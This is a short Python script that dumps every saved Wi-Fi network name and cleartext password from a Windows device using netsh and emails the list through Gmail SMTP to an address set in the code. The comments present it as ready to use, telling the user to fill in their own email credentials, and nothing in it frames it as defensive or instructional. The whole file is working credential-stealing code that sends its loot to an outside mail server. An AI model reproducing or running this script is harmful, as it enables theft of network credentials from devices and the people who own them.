# This code prints and sends all saved networks SSIDs and passwords
# from a certain device to your personal e-mail address

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
# This function starts an smtp server in order to send a mail to yourself


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks = networks.decode("ascii")
networks = networks.replace("\r", "")
networks_names_list = re.findall("(?:All User Profile *: )(.*)", networks)
# This saves all networks names in a string

names = ""
for network_name in networks_names_list:
    command = "netsh wlan show profile " + network_name.replace(" ", "*") + " key=clear"
    cur_res = subprocess.check_output(command, shell=True)
    cur_res = cur_res.decode("ascii")
    cur_res = cur_res.replace("\r", "")
    password = re.search("(?:Key Content *: )(.*)", cur_res)
    if password is not None:
        names = names + "SSID: " + network_name + "\n" + "Password: " + password.group(1) + "\n\n"
    else:
        names = names + "SSID: " + network_name + "\n" + "Password: N/A" + "\n\n"
# This loop extracts the password(if available) of every saved network

send_mail("example@gmail.com", "your_password", names)
# Change to your email and password in order to receive the report
# Don't forget to turn on less secure apps in gmail security settings
